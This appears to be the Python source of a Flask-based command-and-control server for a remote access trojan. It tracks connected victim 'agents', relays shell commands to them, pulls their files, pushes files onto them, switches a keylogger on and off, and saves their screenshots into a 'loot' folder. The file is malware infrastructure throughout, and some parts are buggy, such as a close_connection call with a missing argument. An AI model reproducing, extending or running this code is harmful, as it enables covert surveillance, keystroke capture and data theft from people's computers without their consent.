import socket 
import threading
import time
import datetime
from flask import *
from pathlib import Path



ip_addr = '127.0.0.1'
port_number = 1234

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUPUT = []
IPS = []

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUPUT.append('')


app = Flask(__name__)


def handle_connection(connection, address, thread_index):
    global CMD_OUPUT
    global CMD_INPUT

    while CMD_INPUT[thread_index]!='quit':
        msg = connection.recv(2048).decode()
        CMD_OUPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index]!='':
                #download filename
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename, 'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUPUT[thread_index]='File Transfered Successfully'
                    CMD_INPUT[thread_index]=''
               
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    #upload filename 2048
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('.\\output\\'+filename, 'rb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'got the file':
                        CMD_OUPUT[thread_index]='File Sent Successfully'
                        CMD_INPUT[thread_index]=''
                    else:
                        CMD_OUPUT[thread_index]='Some Error Occured'
                        CMD_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index]=='keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index]=='keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                elif CMD_INPUT[thread_index]=='get ss':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(4096000)

                    ts = time.time()
                    timestamp = datetime.datetime.fromtimestamp(ts).strftime(r'%Y%m%d%H%M%S')
                    filename = "".join(address[0].split("."))+"-"+timestamp
                    f = open(".\\loot\\"+filename+".jpeg","wb")
                    f.write(msg)
                    f.close()
                    fullfilename =filename+".jpg" 
                    CMD_OUPUT[thread_index] = fullfilename
                    CMD_INPUT[thread_index] = ''



                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    if msg=='quit':
                        CMD_INPUT[thread_index]='quit'
                    else:
                        CMD_INPUT[thread_index]=''
                    
                    #msg = connection.recv(2048).decode()
                    break

    close_connection(connection)


def close_connection(connection, thread_index):
    connection.close()
    THREADS[thread_index]=''
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUPUT[thread_index]=''


def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_addr, port_number))
    ss.listen(5)

    global THREADS
    global IPS

    while True:   
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        THREADS.append(t)
        IPS.append(address)
        t.start()

@app.before_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()
    

@app.route("/")
@app.route('/home')
def home():
    return render_template('index.html')

@app.route("/agents")
def agents():
    return render_template('agents.html', threads=THREADS, ips=IPS)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template('execute.html', name=agentname)

@app.route("/<agentname>/execute", methods=['GET', 'POST'])
def execute(agentname):
    if request.method=='POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
                
        CMD_INPUT[req_index]=cmd
        time.sleep(2)
        cmdouput = CMD_OUPUT[req_index]
        return render_template('execute.html', cmdouput=cmdouput, name=agentname)



if __name__== '__main__':
    app.run(debug=True)
